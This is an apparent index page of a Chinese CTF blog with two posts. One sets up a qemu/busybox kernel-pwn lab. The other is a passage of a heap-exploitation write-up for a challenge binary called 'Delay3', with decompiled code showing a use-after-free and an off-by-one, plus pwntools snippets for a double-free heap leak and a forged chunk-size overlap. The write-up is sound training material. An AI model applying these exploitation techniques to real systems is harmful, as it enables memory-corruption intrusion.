<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/27/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/27/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/21/kernel%20environ/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/21/kernel%20environ/" class="post-title-link" itemprop="url">kernel environ</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-21 00:09:08" itemprop="dateCreated datePublished" datetime="2022-03-21T00:09:08+08:00">2022-03-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-15 16:11:22" itemprop="dateModified" datetime="2022-12-15T16:11:22+08:00">2022-12-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="kernel-environ"><a href="#kernel-environ" class="headerlink" title="kernel environ"></a>kernel environ</h2><p><strong>手工搭建内核</strong></p>
<p><strong>qemu</strong></p>
<p>轻量级虚拟化设备，我们主要使用 qemu-system- 系列</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ apt-get install qemu  </span><br></pre></td></tr></table></figure>
<p><strong>busybox</strong></p>
<p>轻量级文件系统，适用于 kernel 开发</p>
<p>输入以下网站获取 busybox：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://busybox.net/downloads/</span><br></pre></td></tr></table></figure>
<ul>
<li>.tar.gz   格式解压为   tar  -zxvf  xx.tar.gz</li>
<li>.tar.bz2  格式解压为   tar  -jxvf  xx.tar.bz2</li>
</ul>
<p>输入以下指令配置文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  make menuconfig</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">│ ┌↑(-)─────────────────────────────────────────────────────────────────┐ │  </span><br><span class="line"> │ │[ ] <span class="function">Support NSA Security Enhanced <span class="title">Linux</span> <span class="params">(NEW)</span>                        │ │  </span></span><br><span class="line"><span class="function"> │ │[ ] Clean up all memory before <span class="title">exiting</span> <span class="params">(usually <span class="keyword">not</span> needed)</span> <span class="params">(NEW)</span>    │ │  </span></span><br><span class="line"><span class="function"> │ │[*] Support LOG_INFO level syslog <span class="title">messages</span> <span class="params">(NEW)</span>                     │ │  </span></span><br><span class="line"><span class="function"> │ │--- Build Options                                                    │ │  </span></span><br><span class="line"><span class="function"> │ │[ ] Build <span class="keyword">static</span> <span class="title">binary</span> <span class="params">(no shared libs)</span> <span class="params">(NEW)</span> <span class="comment">// target             │ │  </span></span></span><br><span class="line"><span class="function"> │ │[ ]   Build position independent <span class="title">executable</span> <span class="params">(NEW)</span>                    │ │  </span></span><br><span class="line"><span class="function"> │ │[ ] Force NOMMU <span class="title">build</span> <span class="params">(NEW)</span>                                          │ │  </span></span><br><span class="line"><span class="function"> │ │[ ] Build shared <span class="title">libbusybox</span> <span class="params">(NEW)</span>                                    │ │  </span></span><br><span class="line"><span class="function"> │ │<span class="params">()</span>  Cross compiler <span class="title">prefix</span> <span class="params">(NEW)</span>                                      │ │  </span></span><br><span class="line"><span class="function"> │ │<span class="params">()</span>  Path to <span class="title">sysroot</span> <span class="params">(NEW)</span>     </span></span><br></pre></td></tr></table></figure>
<p>在“Build static binary”处按“Y”选中（采用静态编译，为了不添加动态链接库）</p>
<p>直接退出，退出时保存，接下来就是busybox编译了：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  make -j4    </span><br><span class="line">➜  make install</span><br></pre></td></tr></table></figure>
<img src="/2022/03/21/kernel%20environ/1647750293619-1664789642583.png" class width="1647750293619"> 
<p>这个“_install”就是编译好的文件了，输入以下指令：（复制 rootfs ）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  cp rootfs -r ..</span><br></pre></td></tr></table></figure>
<p>在 <code>_install</code> 目录下创建以下文件夹</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  mkdir proc</span><br><span class="line">mkdir sys</span><br><span class="line">touch init</span><br><span class="line">chmod +x init</span><br></pre></td></tr></table></figure>
<p><code>init</code> 为 linux 的初始化脚本，内容为：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">mdev -s # We need this to find /dev/sda later</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br></pre></td></tr></table></figure>
<p>创建 <code>pack.sh</code> 作为 linux 的打包脚本，内容如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">echo &quot;Generate rootfs.img&quot;</span><br><span class="line">cd busybox # fs folder</span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br></pre></td></tr></table></figure>
<p>创建 <code>start.sh</code> 作为 linux 的启动脚本，内容如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m <span class="number">64</span>M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kalsr&quot;</span> \</span><br><span class="line">    -smp cores=<span class="number">2</span>,threads=<span class="number">1</span> \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure>
<p><strong>kernel pwn</strong></p>
<p>一般的 kernel pwn 都有三个文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">boot.sh (启动脚本 - &quot;.sh&quot;)</span><br><span class="line">bzImage (内核 - &quot;bzImage&quot;)</span><br><span class="line">initramfs.cpio (内置的busybox文件系统 - &quot;.cpio&quot;)</span><br></pre></td></tr></table></figure>
<p>在busybox文件系统中就会有对应的驱动文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn.ko (驱动文件 - &quot;.ko&quot;)</span><br></pre></td></tr></table></figure>
<p>用 file 指令获取目标内核的信息</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  babykernel file bzImage</span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version 4.19.26 (bird@ubuntu18) #2 SMP Tue Jun 4 18:57:49 CST 2019, RO-rootFS, swap_dev 0x8, Normal VGA</span><br></pre></td></tr></table></figure>
<p>在 kernel 官网上下载对应版本的内核</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/ </span><br></pre></td></tr></table></figure>
<p>然后观察它是用什么编译器编译出来的（gcc版本会影响编译）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  babykernel strings bzImage | grep gcc</span><br><span class="line">yygcc3s!</span><br><span class="line">4.19.26 (bird@ubuntu18) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04)) #2 SMP Tue Jun 4 18:57:49 CST 2019</span><br></pre></td></tr></table></figure>
<p>输入以下指令配置文件：(直接退出，默认就好)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  make menuconfig </span><br></pre></td></tr></table></figure>
<p>在进行 kernel 编译之前要进行 gcc 版本替换</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls -l /usr/bin/gcc*</span><br><span class="line">sudo apt-get install -y gcc-7 g++-7</span><br><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-7 20 --slave /usr/bin/g++ g++ /usr/bin/g++-7</span><br><span class="line">sudo update-alternatives --config gcc</span><br><span class="line">gcc -v</span><br></pre></td></tr></table></figure>
<p>接下来就是 kernel 编译了（通过“-jn”来指定线程数）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  make bzImage -j4</span><br></pre></td></tr></table></figure>
<ul>
<li>bzImage：<code>arch/x86/boot/bzImage</code></li>
<li>vmlinux：源码所在的根目录下</li>
</ul>
<p><strong>下载现有内核</strong></p>
<p>使用如下命令列出可下载内核镜像 </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt search linux-image-</span><br></pre></td></tr></table></figure>
<p>选一个自己喜欢的下载就行，笔者所用的阿里云源似乎没有最新的5.11的镜像，这里用5.8的做个示范： </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt download linux-image-5.8.0-43-generic</span><br></pre></td></tr></table></figure>
<p>下载下来是一个deb文件，解压 </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> dpkg -X ./linux-image-5.8.0-43-generic_5.8.0-43.49~20.04.1_amd64.deb extract</span></span><br><span class="line">./</span><br><span class="line">./boot/</span><br><span class="line">./boot/vmlinuz-5.8.0-43-generic</span><br><span class="line">./usr/</span><br><span class="line">./usr/share/</span><br><span class="line">./usr/share/doc/</span><br><span class="line">./usr/share/doc/linux-image-5.8.0-43-generic/</span><br><span class="line">./usr/share/doc/linux-image-5.8.0-43-generic/changelog.Debian.gz</span><br><span class="line">./usr/share/doc/linux-image-5.8.0-43-generic/copyright</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>遇到的问题</strong></p>
<p>1.<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51203305/article/details/120805372">Linux内核编译错误</a> </p>
<p>2.kernel无法开启，无效循环（我重新做了一次后发现问题消失了，目前不知道原因）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/19/main_arena%E5%8A%AB%E6%8C%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/19/main_arena%E5%8A%AB%E6%8C%81/" class="post-title-link" itemprop="url">main_arena劫持</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-19 18:40:16" itemprop="dateCreated datePublished" datetime="2022-03-19T18:40:16+08:00">2022-03-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-04-02 16:56:32" itemprop="dateModified" datetime="2023-04-02T16:56:32+08:00">2023-04-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>10 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Delay3</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/桌面] ./Delay3 </span><br><span class="line">I am lazy again...</span><br><span class="line"><span class="number">1.</span> add</span><br><span class="line"><span class="number">2.</span> show</span><br><span class="line"><span class="number">3.</span> <span class="keyword">delete</span></span><br><span class="line">choice :</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Delay3: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=edcd74af07248bb015dfdb61762ab93dce45667f, stripped</span><br><span class="line"></span><br><span class="line">[*] <span class="string">&#x27;/home/ywhkkx/桌面/Delay3&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.23</span><span class="number">-0u</span>buntu11)</span> stable release versio</span></span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> index; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;id:&quot;</span>);</span><br><span class="line">  index = read_s();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt;= <span class="number">9</span> &amp;&amp; chunk_list[index] )</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)chunk_list[index]);            <span class="comment">// UAF</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid id!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">read_r</span><span class="params">(__int64 chunk, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; size; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>) == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(chunk + i) = buf;</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(i + chunk) = <span class="number">0</span>;                <span class="comment">// off-by-one</span></span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(i + chunk) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<ul>
<li>对“size”的限制导致 chunk 无法进入 unsortedbin</li>
<li>read_r 对末尾字节的置空限制了打印模块（同时也带来了 off-by-one）</li>
<li>程序每5秒钟置空一次 chunk_list</li>
</ul>
<p>因为多线程会导致GDB打印不了数据，所以先把“pthread_create”改为了“menu”，把chunk的数量限制也改了：（再源文件中可以通过 sleep 获得原本的效果）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000000</span>ED5                 lea     rdx, start_routine ; start_routine</span><br><span class="line">.text:<span class="number">0000000000000</span>EDC                 mov     esi, <span class="number">0</span>          ; attr</span><br><span class="line">.text:<span class="number">0000000000000</span>EE1                 mov     rdi, rax        ; newthread</span><br><span class="line">.text:<span class="number">0000000000000</span>EE4                 call    menu <span class="comment">// 原本是pthread_create</span></span><br></pre></td></tr></table></figure>
<p>先泄露“heap_addr”：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_addr=leak_addr-<span class="number">0x50</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure>
<p>限制了 unsortedbin 怎么泄露“libc_base”呢？</p>
<ul>
<li>tcache perthread corruption 劫持 count（直接排除）</li>
<li>house of orange 中的思想：当 top chunk-&gt;size 不足时会把整个 top chunk 放入 unsortedbin，所以通过覆盖 top chunk-&gt;size 的方式进行入侵（行不通，因为页对齐的原因“size”最小为“0xf41”）</li>
<li>因为本程序每5秒钟都会清空一次 chunk_list ，所以理论上来说，可以无限申请 chunk，这时就需要利用这个机制把 top chunk 申请完，剩下的 top chunk 进入unsortedbin时乘机泄露（也失败了，因为程序会在半分钟后自动关闭）</li>
<li>利用 Double free 实现 overlap ，覆盖某个chunk的size来使该chunk可以进入 unsortedbin（好像可行）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk</span><br><span class="line">Addr: <span class="number">0x55bbab8f3060</span></span><br><span class="line">Size: <span class="number">0x100</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x48</span>,p64(leak_addr<span class="number">-0x10</span>))</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;3&#x27;</span>*(<span class="number">0x48</span><span class="number">-0x18</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x50</span>))</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;4&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)</span><br><span class="line">add(<span class="number">0x48</span>,payload)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;5&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;6&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span 